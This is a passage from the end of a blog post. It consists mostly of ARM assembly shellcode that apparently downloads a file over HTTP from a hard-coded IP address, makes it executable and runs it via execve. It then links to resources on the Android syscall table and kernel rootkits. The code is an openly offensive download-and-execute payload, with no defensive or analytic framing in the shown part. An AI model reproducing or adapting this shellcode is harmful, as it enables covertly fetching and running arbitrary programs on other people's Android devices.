</span><span style="color:#82aaff;">  swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@chmod(name</span><span>, </span><span style="color:#82aaff;">S_IRUSR|S_IWUSR|S_IXUSR)
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">push </span><span style="color:#82aaff;">{r1}
</span><span style="color:#82aaff;">  adr r0</span><span>, </span><span style="color:#82aaff;">name
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">push </span><span style="color:#82aaff;">{r0} @argv</span><span>[</span><span style="color:#f78c6c;">0</span><span>]
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#f78c6c;">sp </span><span style="color:#82aaff;">@argv
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">11
</span><span style="color:#82aaff;">  swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@execve(name</span><span>, </span><span style="color:#82aaff;">argv</span><span>, </span><span style="color:#82aaff;">NULL)
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r0</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">1
</span><span style="color:#82aaff;">  swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@exit(</span><span style="color:#f78c6c;">0</span><span style="color:#82aaff;">)
</span><span style="color:#82aaff;">addr:
</span><span style="color:#82aaff;">  .short </span><span style="color:#f78c6c;">2 </span><span style="color:#82aaff;">@AF_INET
</span><span style="color:#82aaff;">  .ascii </span><span style="color:#c3e88d;">&quot;\x00\x50&quot; </span><span style="color:#82aaff;">@port
</span><span style="color:#82aaff;">  .byte </span><span style="color:#f78c6c;">202</span><span>, </span><span style="color:#f78c6c;">120</span><span>, </span><span style="color:#f78c6c;">2</span><span>, </span><span style="color:#f78c6c;">102 </span><span style="color:#82aaff;">@</span><span style="color:#f78c6c;">ip
</span><span style="color:#82aaff;">  .zero </span><span style="color:#f78c6c;">8
</span><span style="color:#82aaff;">head:
</span><span style="color:#82aaff;">  .ascii </span><span style="color:#c3e88d;">&quot;GET /&quot;
</span><span style="color:#82aaff;">  .ascii </span><span style="color:#c3e88d;">&quot;&quot; </span><span style="color:#82aaff;">@file
</span><span style="color:#82aaff;">  .ascii </span><span style="color:#c3e88d;">&quot; HTTP/1.1\r\n&quot;
</span><span style="color:#82aaff;">  .ascii </span><span style="color:#c3e88d;">&quot;HOST: &quot;
</span><span style="color:#82aaff;">  .ascii </span><span style="color:#c3e88d;">&quot;www.android.com&quot; </span><span style="color:#82aaff;">@host
</span><span style="color:#82aaff;">  .ascii </span><span style="color:#c3e88d;">&quot;\r\n\r\n\x00&quot;
</span><span style="color:#82aaff;">  .zero </span><span style="color:#f78c6c;">2
</span><span style="color:#82aaff;">name:
</span><span style="color:#82aaff;">  .asciz </span><span style="color:#c3e88d;">&quot;xxx&quot;
</span><span style="color:#82aaff;">nrnr:
</span><span style="color:#82aaff;">  .ascii </span><span style="color:#c3e88d;">&quot;\n\r\n\r&quot;
</span></code></pre>
<p>
    Here for howto get system call table:</p>
<p>
    <a href="https://viaforensics.com/mobile-security/syscalltable-android-playing-rootkits.html">https://viaforensics.com/mobile-security/syscalltable-android-playing-rootkits.html</a></p>
<p>
    And a perfect android kernel rookit paper here:</p>
<p>
    <a href="http://www.phrack.org/issues/68/6.html">http://www.phrack.org/issues/68/6.html</a></p>
<p>
    &nbsp;</p>
<p>
    Code Ref</p>
<p>
    x86:&nbsp;<a href="https://android.googlesource.com/kernel/common.git/+/android-3.10/arch/x86/kernel/entry_32.S">https://android.googlesource.com/kernel/common.git/+/android-3.10/arch/x86/kernel/entry_32.S</a></p>
<p>
    x64:&nbsp;<a href="https://android.googlesource.com/kernel/common.git/+/android-3.10/arch/x86/kernel/entry_64.S">https://android.googlesource.com/kernel/common.git/+/android-3.10/arch/x86/kernel/entry_64.S</a></p>
<p>
    arm: <a href="https://android.googlesource.com/kernel/common.git/+/android-3.10/arch/arm/kernel/entry-common.S">https://android.googlesource.com/kernel/common.git/+/android-3.10/arch/arm/kernel/entry-common.S</a></p></div>


  <div class="post-footer">

  
    <div class="post-tags">
    
      <!-- <a href="https://xjump.me/tags/all/">#all</a> -->
    
    </div>
  
  
    <div class="post-nav">
    
      <a class="previous" href="https:&#x2F;&#x2F;xjump.me&#x2F;20130109-android-click-hijack&#x2F;">‹ Android点击劫持</a>
    
    
      <a class="next" href="https:&#x2F;&#x2F;xjump.me&#x2F;20130112-xinjector&#x2F;">xInjector ›</a>
    
    
    
    </div>
  

  </div>


</article>

      </div>
    </main>



  </div>


<script type="text/javascript" src="/even.js"></script>

</body></html>
